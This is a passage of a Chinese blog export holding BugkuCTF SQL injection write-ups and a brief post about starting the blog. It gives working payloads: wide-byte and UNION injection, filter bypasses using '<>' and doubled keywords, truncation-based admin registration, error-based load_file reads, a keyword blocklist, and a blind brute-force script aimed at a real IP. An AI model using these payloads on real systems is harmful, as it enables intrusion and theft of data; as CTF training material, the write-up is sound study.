version()&gt;0 --+返回正确，说明数据库可能是sqlserver或者mysql ?id=1%bf&#39; and length(user())&gt;0 --+返回正确，说明存在user()函数，数据库为mysql ?id=1%df&#39; order by 2 --+正常回显，?id=1%df&#39; order by 3 --+报错，证明一共有两列 ?id=1%df&#39; union select database(),2 --+得数据库名sql5 已知表名为key，字段名为string，直接构造?id=1%df&#39; union select 1,string from sql5.key --+ SQL注入1题目过滤了关键字 1234567891011121314//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = \"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1\"; 但是往后看发现这句$id = strip_tags($id);，strip_tags() 函数可以剥去字符串中的 HTML、XML 以及 PHP 的标签，这样就可以利用&lt;&gt;绕过。 ?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,database()--+得数据库名sql3 根据已知条件构造?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key --+得flag 成绩单这里--+被过滤了，用#注释 试着输入0&#39; or 1=1 union select 1,2 #，0&#39;or 1=1 union select 1,2,3 #无回显，0&#39; or 1=1 union select 1,2,3,4 #正常显示 所以输入0&#39; union select database(),null,null,null #得数据库名skctf_flag 0&#39; union select table_name,2,3,4 from information_schema.tables where table_schema = &#39;skctf_flag&#39;#得表名fl4g 0&#39; union select column_name,2,3,4 from information_schema.columns where table_name=&#39;fl4g&#39; #得列名skctf_flag 最后一步0&#39; union select skctf_flag,2,3,4 from fl4g #得flag login1提示SQL约束攻击，这里可以先了解一下约束攻击什么意思，附链接：戳这里 大概意思是在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说”admin”等同于”admin “。例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的。 SELECT * FROM users WHERE username=&#39;admin &#39;; 现在可以试着操作了。点进去是个登陆页面，还看到了注册链接。先随便注册一个然后登陆，显示不是管理员还想看flag？！。。想知道管理员用户名然后尝试注入发现没啥用，于是去注册页面试着以admin为用户名注册，页面提示admin已存在 。好的这下好办了，根据提示得SQL约束攻击，直接去注册一个账号用户名叫’admin ‘（admin后加空格），设置密码，再去登陆得flag。 这是一个神奇的登陆框试着输入发现单引号被过滤了，但是双引号没被过滤。 0&quot; or 1=1 order by 2 #正常回显，0&quot; or 1=1 order by 3 #显示错误，说明有两列。 0&quot; union select database(),null #得数据库名bugkusql1 0&quot; union select table_name,null from information_schema.tables where table_schema=&#39;bugkusql1&#39; #得表名flag1 0&quot; union select column_name,null from information_schema.columns where table_name=&#39;flag1&#39; #得列名flag1 最后0&quot; union select flag1,null from bugkusql1.flag1 #得flag 多次点进去就会注意到?id=1，说明这个很有可能是个注入题，加单引号出错，确实可以注入。 可是不知道过滤了什么，这里可以使用异或来判断有哪些关键词被过滤了。 一上来先试试行不行?id=1&#39;^(0)--+页面返回正确，再输入?id=1&#39;^(1)--+显示错误，说明如果页面显示有误那么括号里的内容应该为真。这里可以用length()函数判断有哪些关键词被过滤了。 ?id=1&#39;^(length(&#39;union&#39;)&gt;0)--+页面返回正确，说明union被过滤了。 同理，用这种方法验证一些其他的常用关键词，会发现union，select，and，or被过滤了，但是可以构造类似ununionion的形式绕过。 ?id=0&#39; ununion selselectect 1,2--+在2位上有回显 ?id=0&#39; ununionion selselectect 1,database()--+得库名web1002-1 ?id=0&#39; ununionion selselectect 1,(selselectect table_name from infoorrmation_schema.tables where table_schema=&#39;web1002-1&#39; limit 0,1)--+得表名flag1，改变limit发现另一个表hint。（这个information好坑，里面有or。。。） ?id=0&#39; ununionion selselectect 1,(selselectect column_name from infoorrmation_schema.columns where table_name=&#39;flag1&#39; limit 0,1)--+得字段名flag1，还有一个叫address。同理查出hint表里有id和contents字段。 ?id=0&#39; ununionion selselectect 1,(selselectect flag1 from flag1 limit 0,1)--+得到usOwycTju+FTUUzXosjr，这个应该是第一个flag了。 然后去访问address，因该会有下一关地址。?id=0&#39; ununionion selselectect 1,(selselectect address from flag1 limit 0,1)--+得到./Once_More.php 进入第二关，加单引号出现报错，开始注入。观察Id的回显发现union和加号都被过滤了，再试试别的关键词，sleep和substr也被过滤掉了。用ununionion后面的select也没了，换ununionion selselectect试试，这次好像没啥问题，结果不回显了。。 于是到这就注不下去了（咸鱼的我），看网上大佬们写了脚本爆破，借此机会学习下。 贴上大佬的脚本： 12345678910111213141516def flag2(): flag ='' for j in xrange(1, 100): temp = '!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~' key = 0 for i in temp: url = \"http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'\"+str(i)+\"',(select flag2 from flag2),\"+str(j)+\"))=\"+str(j)+\"%23\" r1 = rs.get(url) # print url if \"Hello\" in r1.text: print str(i)+\" -----\"+str(j) flag += str(i) print \"[*] : \"+flag key = 1 if key ==0: break 加点东西然后运行一下得到最终的flag 报错注入附报错注入相关知识的连接：戳这里，这个也不错，还有这个 这题链接打不开了，用别人的解题思路总结一下 题目提示不可以包含’’–’’，空格，单引号，双引号，’’union’’关键字。这里可以用换行符替换空格。 通过extractvalue报错 ?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(select%0A@@version),0x7e))成功报错 题目要求读文件双引号里面的内容（即flag），需要查询的文件路径为/var/test/key_1.php，文件名转十六进制表示0x2f7661722f746573742f6b65795f312e706870 现在读取文件 ?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))),0x7e)) 但是extractvalue只能读32位（转换成字符串只有16位），其实是被截断了，可以用substr(str,start,length)读取剩余部分id=1%0Aand%0Aextractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))%0Afrom%0A161%0Afor%0A20),0x7e)) 接下来修改偏移量把整个文件读完就可以了，最后恢复的文件内容如下： 1&lt;?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:\"7249f5a7fd1de602b30e6f39aea6193a\"fsdafsafdsafdsafdsafa ?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://yoursite.com/tags/SQL/"},{"name":"BugkuCTF","slug":"BugkuCTF","permalink":"http://yoursite.com/tags/BugkuCTF/"}]},{"title":"New Start","slug":"New-Start","date":"2018-08-11T14:06:25.000Z","updated":"2018-08-18T12:03:12.012Z","comments":true,"path":"2018/08/11/New-Start/","link":"","permalink":"http://yoursite.com/2018/08/11/New-Start/","excerpt":"","text":"新的开始 hello, blog! 为了搭一个满意的博客真的踩了不少坑，之前搭过但是不知道哪出了问题没成功。。。后来图方便就去wordpress找了模板，部署很简单想要什么直接添加，虽然很方便但是感觉编辑器用的真心不上手，所以今天突然想重新认认真真搞一次。这次用的之前在Hexo官网上看中的模板，终于算是成功搭建了，还有很多地方没有完善，以后慢慢往里添东西。 最后，就是希望自己继续加油吧 : ) 现在还差的太多，啥都不会，还有好多知识要学。既然选择了就好好把这条路走下去，为了更好的明天。（这么正经的说话真的不像我:o） 最后的最后，假装文艺地来个结束语。 It’s a long way to go, but it’s never too late to get started.","categories":[],"tags":[{"name":"Life","slug":"Life","permalink":"http://yoursite.com/tags/Life/"}]}]}